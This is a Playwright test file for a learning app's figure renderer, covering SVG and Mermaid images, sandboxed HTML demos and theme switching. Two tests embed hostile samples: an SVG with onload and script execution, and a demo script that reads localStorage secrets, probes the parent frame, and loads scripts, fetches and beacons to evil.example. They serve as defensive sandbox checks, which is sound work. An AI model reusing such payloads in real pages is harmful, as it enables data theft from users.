// Browser tests of figures (phase 5 step 6, plan hinh-va-demo.md A2-A5): SVG and Mermaid as images,
// demos in the sandboxed frame, CDN libraries by SRI, theme changes. Through the harness route
// `/dev/figures`. CDN files are served from node_modules (no network in CI).
import { readFileSync } from 'node:fs';
import { expect, test, type Page } from '@playwright/test';
import { demoLibraries, type FigureInfo } from '@kd-learn/core';
import { figureVars, themeById, type ColorMode } from '@kd-learn/tokens';

/**
 * Every test runs in four appearances (plan theme-va-dien-thoai.md step 4): a theme change must
 * not break a diagram, Mermaid or a demo. Set by the `kd_appearance` cookie, as a user would.
 */
const appearances: ReadonlyArray<{ mode: ColorMode; theme: string }> = [
  { mode: 'light', theme: 'kd' },
  { mode: 'dark', theme: 'kd' },
  { mode: 'dark', theme: 'ocean' },
  { mode: 'light', theme: 'kd-contrast' },
];

const rgb = (hex: string) =>
  [1, 3, 5].map((i) => Number.parseInt(hex.slice(i, i + 2), 16)).join(',');

/** Library files as installed (pinned devDependencies of apps/web). */
const installed = (npmPath: string) => new URL(`../node_modules/${npmPath}`, import.meta.url);

type Body = string | { base64: string };
interface Shown {
  content: string;
  figures: Array<FigureInfo>;
  bodies: Record<string, Body>;
  isStreaming?: boolean;
}

const info = (figureId: string, kind: FigureInfo['kind'], extra: Partial<FigureInfo> = {}) =>
  ({
    figureId,
    kind,
    title: `Figure ${figureId}`,
    mime:
      kind === 'svg'
        ? 'image/svg+xml'
        : kind === 'mermaid'
          ? 'text/vnd.mermaid'
          : kind === 'html'
            ? 'text/html'
            : 'image/png',
    bytes: 1,
    ...extra,
  }) as FigureInfo;

/** Requests the page made to hosts other than the app. Library files come from node_modules. */
async function open(page: Page) {
  const outside: Array<string> = [];
  await page.route(
    // http(s) only: WebKit routes blob: URLs too, and their hostname is empty.
    (url) => url.protocol.startsWith('http') && url.hostname !== 'localhost',
    async (route) => {
      const url = route.request().url();
      const library = demoLibraries.find((l) => l.url === url);
      if (library === undefined) {
        outside.push(url);
        return route.fulfill({ status: 404, body: '' });
      }
      return route.fulfill({
        status: 200,
        contentType: 'text/javascript',
        headers: { 'access-control-allow-origin': '*' },
        body: readFileSync(installed(library.npmPath)),
      });
    },
  );
  await page.goto('/dev/figures');
  await expect(page.locator('body[data-figures-ready="true"]')).toBeAttached();
  return outside;
}

const show = (page: Page, shown: Shown) =>
  page.evaluate((value) => window.__kdFigures!.show(value), shown);

/** The color of the image's center pixel, as `r,g,b`. */
const centerColor = (page: Page) =>
  page
    .getByTestId('figure-image')
    .first()
    .evaluate(async (image: HTMLImageElement) => {
      // Not `image.decode()`: WebKit rejects it for SVG images that did load.
      for (let i = 0; i < 100 && !(image.complete && image.naturalWidth > 0); i++) {
        await new Promise((resolve) => setTimeout(resolve, 20));
      }
      const canvas = document.createElement('canvas');
      canvas.width = image.naturalWidth;
      canvas.height = image.naturalHeight;
      const context = canvas.getContext('2d')!;
      context.drawImage(image, 0, 0);
      const [r, g, b] = context.getImageData(canvas.width / 2, canvas.height / 2, 1, 1).data;
      return `${r},${g},${b}`;
    });

for (const appearance of appearances) {
  const vars = figureVars(themeById(appearance.theme), appearance.mode);

  test.describe(`${appearance.mode} ${appearance.theme}`, () => {
    test.beforeEach(async ({ context, baseURL }) => {
      await context.addCookies([
        {
          name: 'kd_appearance',
          value: `${appearance.mode}.${appearance.theme}`,
          url: baseURL ?? '',
        },
      ]);
    });

    test('an SVG figure shows as an image: its script never runs, nothing external loads', async ({
      page,
    }) => {
      const outside = await open(page);
      const svg = [
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" onload="top.__svgRan = 1">',
        '<script>top.__svgRan = 2</script>',
        '<image href="https://tracker.example/pixel.png" width="10" height="10"/>',
        '<rect width="40" height="40" fill="var(--kd-accent)"/>',
        '</svg>',
      ].join('');
      await show(page, {
        content: 'Before.\n\n[[figure:s1]]\n\nAfter.',
        figures: [info('s1', 'svg')],
        bodies: { s1: svg },
      });
      const image = page.getByTestId('figure-image');
      await expect(image).toBeVisible();
      expect(await image.evaluate((img: HTMLImageElement) => img.src)).toMatch(/^blob:/);
      expect(await centerColor(page)).toBe(rgb(vars['--kd-accent'])); // --kd-accent of the default theme
      await page.waitForTimeout(300);
      expect(await page.evaluate(() => (window as { __svgRan?: number }).__svgRan)).toBeUndefined();
      expect(outside).toEqual([]);
      await expect(page.getByText('Before.')).toBeVisible();
      await expect(page.getByText('After.')).toBeVisible();
    });

    test('the theme reaches a diagram: a new color redraws it', async ({ page }) => {
      await open(page);
      await show(page, {
        content: '[[figure:s1]]',
        figures: [info('s1', 'svg')],
        bodies: {
          s1: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><rect width="40" height="40" fill="var(--kd-accent)"/></svg>',
        },
      });
      await expect(page.getByTestId('figure-image')).toBeVisible();
      expect(await centerColor(page)).toBe(rgb(vars['--kd-accent']));
      await page.evaluate(() => window.__kdFigures!.setVars({ '--kd-accent': '#00ff00' }));
      await expect.poll(() => centerColor(page)).toBe('0,255,0');
    });

    test('an SVG that does not parse shows its code and the reason', async ({ page }) => {
      await open(page);
      await show(page, {
        content: '[[figure:s1]]',
        figures: [info('s1', 'svg')],
        bodies: { s1: '<svg xmlns="http://www.w3.org/2000/svg"><rect></svg>' },
      });
      await expect(page.getByTestId('figure-error')).toBeVisible();
      await expect(page.getByTestId('figure-image')).toHaveCount(0);
    });

    test('Mermaid renders to an image, and bad code shows an error', async ({ page }) => {
      await open(page);
      await show(page, {
        content: '[[figure:m1]]\n\n[[figure:m2]]',
        figures: [info('m1', 'mermaid'), info('m2', 'mermaid')],
        bodies: { m1: 'flowchart LR\n  A[Radius] --> B[Area]', m2: 'flowchart LR\n  A -->' },
      });
      const image = page.getByTestId('figure-image');
      await expect(image).toHaveCount(1, { timeout: 20_000 });
      // Sized from the viewBox: Mermaid's own `width="100%"` must not become 100 px.
      await expect
        .poll(() => image.evaluate((img: HTMLImageElement) => img.naturalWidth))
        .toBeGreaterThan(150);
      // The drawing is there: a pixel in the middle of the image is not the background.
      await expect
        .poll(() =>
          image.evaluate((img: HTMLImageElement) => {
            const canvas = document.createElement('canvas');
            canvas.width = img.naturalWidth;
            canvas.height = img.naturalHeight;
            const context = canvas.getContext('2d')!;
            context.drawImage(img, 0, 0);
            const { data } = context.getImageData(0, 0, canvas.width, canvas.height);
            let inked = 0;
            for (let i = 3; i < data.length; i += 4) if (data[i]! > 0) inked += 1;
            return inked;
          }),
        )
        .toBeGreaterThan(500);
      await expect(page.getByTestId('figure-error')).toHaveCount(1);
    });

    test('a marker without its figure is a placeholder while streaming, a note after', async ({
      page,
    }) => {
      await open(page);
      await show(page, {
        content: 'Look: [[figure:x1]]',
        figures: [],
        bodies: {},
        isStreaming: true,
      });
      await expect(page.getByTestId('figure-note')).toBeVisible();
      await show(page, { content: 'Look: [[figure:x1]]', figures: [], bodies: {} });
      await expect(page.getByTestId('figure-note')).toBeVisible();
    });

    test('a demo runs only on Run, loads a listed library, and follows the theme', async ({
      page,
    }) => {
      const outside = await open(page);
      const html = [
        '<p id="out">waiting</p>',
        '<button id="b" onclick="document.getElementById(\'out\').dataset.clicked = \'yes\'">b</button>',
        '<div id="box" style="width:20px;height:20px;background:var(--kd-accent)"></div>',
        "<script>document.getElementById('out').textContent = typeof d3.select;</script>",
      ].join('');
      await show(page, {
        content: '[[figure:d1]]',
        figures: [info('d1', 'html', { libraries: ['d3'] })],
        bodies: { d1: html },
      });
      await expect(page.getByTestId('figure-frame')).toHaveCount(0);
      await page.getByRole('button', { name: 'Run' }).click();
      const frame = page.frameLocator('[data-testid="figure-frame"]');
      await expect(frame.locator('#out')).toHaveText('function');
      await frame.locator('#b').click();
      await expect(frame.locator('#out')).toHaveAttribute('data-clicked', 'yes');
      const background = () =>
        frame.locator('#box').evaluate((el) => getComputedStyle(el).backgroundColor);
      expect(await background()).toBe(`rgb(${rgb(vars['--kd-accent']).replaceAll(',', ', ')})`);
      await page.evaluate(() => window.__kdFigures!.setVars({ '--kd-accent': '#00ff00' }));
      await expect.poll(background).toBe('rgb(0, 255, 0)');
      await page.getByRole('button', { name: 'Stop' }).click();
      await expect(page.getByTestId('figure-frame')).toHaveCount(0);
      expect(outside).toEqual([]);
    });

    test('a demo cannot reach anything outside the list, or the app', async ({ page }) => {
      const outside = await open(page);
      await page.evaluate(() => localStorage.setItem('kd-secret', 'app-data'));
      const html = [
        '<p id="out">start</p>',
        '<script src="https://evil.example/own.js"></script>',
        '<script>',
        "const out = document.getElementById('out'); const notes = [];",
        "try { notes.push('ls:' + localStorage.getItem('kd-secret')); } catch (e) { notes.push('ls:blocked'); }",
        "try { notes.push('parent:' + parent.document.title); } catch (e) { notes.push('parent:blocked'); }",
        "try { eval('1'); notes.push('eval:ran'); } catch (e) { notes.push('eval:blocked'); }",
        "const s = document.createElement('script'); s.src = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js'; document.head.append(s);",
        "const d = document.createElement('script'); d.src = '" +
          demoLibraries[0].url +
          "?x=1'; document.head.append(d);",
        "fetch('https://evil.example/fetch').then(() => notes.push('fetch:ran'), () => notes.push('fetch:blocked'));",
        "new Image().src = 'https://evil.example/pixel.png';",
        "setTimeout(() => { out.textContent = notes.join(' '); }, 300);",
        "setTimeout(() => { location.href = 'https://evil.example/navigate'; }, 1500);",
        '</script>',
      ].join('\n');
      await show(page, {
        content: '[[figure:h1]]',
        figures: [info('h1', 'html')],
        bodies: { h1: html },
      });
      await page.getByRole('button', { name: 'Run' }).click();
      const frame = page.frameLocator('[data-testid="figure-frame"]');
      await expect(frame.locator('#out')).toContainText('fetch:blocked');
      const text = await frame.locator('#out').textContent();
      expect(text).toContain('ls:blocked');
      expect(text).toContain('parent:blocked');
      expect(text).toContain('eval:blocked');
      await expect(page.getByTestId('figure-demo-error')).toContainText('Blocked by the sandbox');
      // The frame then tries to navigate itself away: the app's frame-src stops it (risk 43).
      await page.waitForTimeout(2000);
      expect(outside).toEqual([]);
    });
  });
}

test('switching to dark mode mid-lesson redraws a diagram and recolors a running demo', async ({
  page,
}) => {
  await open(page);
  await show(page, {
    content: '[[figure:s1]]\n\n[[figure:d1]]',
    figures: [info('s1', 'svg'), info('d1', 'html')],
    bodies: {
      s1: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><rect width="40" height="40" fill="var(--kd-bg)"/></svg>',
      d1: '<div id="box" style="width:20px;height:20px;background:var(--kd-bg)"></div>',
    },
  });
  const light = figureVars(themeById('kd'), 'light');
  const dark = figureVars(themeById('kd'), 'dark');
  await page.evaluate(() => window.__kdFigures!.setAppearance({ mode: 'light', theme: 'kd' }));
  await expect.poll(() => centerColor(page)).toBe(rgb(light['--kd-bg']));
  await page.getByRole('button', { name: 'Run' }).click();
  const frame = page.frameLocator('[data-testid="figure-frame"]');
  const scheme = () =>
    frame.locator('#box').evaluate(() => getComputedStyle(document.documentElement).colorScheme);
  await expect.poll(scheme).toBe('light');

  await page.evaluate(() => window.__kdFigures!.setAppearance({ mode: 'dark', theme: 'kd' }));
  await expect.poll(() => centerColor(page)).toBe(rgb(dark['--kd-bg']));
  await expect
    .poll(() => frame.locator('#box').evaluate((el) => getComputedStyle(el).backgroundColor))
    .toBe(`rgb(${rgb(dark['--kd-bg']).replaceAll(',', ', ')})`);
  await expect.poll(scheme).toBe('dark');
});
